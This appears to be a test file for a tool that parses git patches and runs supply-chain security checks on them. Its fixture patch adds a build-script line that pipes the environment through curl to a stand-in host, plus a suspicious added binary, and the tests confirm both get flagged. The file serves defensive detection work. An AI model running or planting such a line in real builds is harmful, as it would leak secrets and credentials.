"""eval/incident_replay.py: parsing a git patch into the files the checks read, and running them (no network)."""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "eval"))
import incident_replay as R  # noqa: E402

PATCH = """From abc Mon Sep 17 00:00:00 2001
Subject: [PATCH] build

---
 build.sh | 1 +
 1 file changed

diff --git a/build.sh b/build.sh
index 1..2 100644
--- a/build.sh
+++ b/build.sh
@@ -1,1 +1,2 @@
 set -e
+env | curl -d @- https://x.example
diff --git a/tests/files/a.xz b/tests/files/a.xz
new file mode 100644
index 0000000..1
Binary files /dev/null and b/tests/files/a.xz differ
-- 
2.43.0
"""


def test_a_patch_becomes_files_with_hunks_only():
    fs = R.files_of(PATCH)
    assert [(f["filename"], f["status"], f["binary"]) for f in fs] == [("build.sh", "modified", False), ("tests/files/a.xz", "added", True)]
    assert fs[0]["patch"].startswith("@@ -1,1 +1,2 @@") and "2.43.0" not in fs[0]["patch"] and fs[1]["patch"] == ""


def test_the_checks_run_on_the_parsed_files_and_the_result_keeps_no_code():
    row = R.run({"id": "t", "what": "w", "page": "p", "expects": "shapes"}, PATCH)
    assert row["shapes"] == [{"path": "build.sh", "line": 2, "kind": "env-to-network"}]
    assert row["extras"] == [{"kind": "binary_or_large_added", "path": "tests/files/a.xz"}]
    assert "curl" not in str(row) and len(row["sha256"]) == 64


def test_what_cannot_be_replayed_is_listed_with_a_reason():
    assert len(R.NOT_REPLAYED) >= 3 and all(n["id"] and len(n["why"]) > 20 for n in R.NOT_REPLAYED)
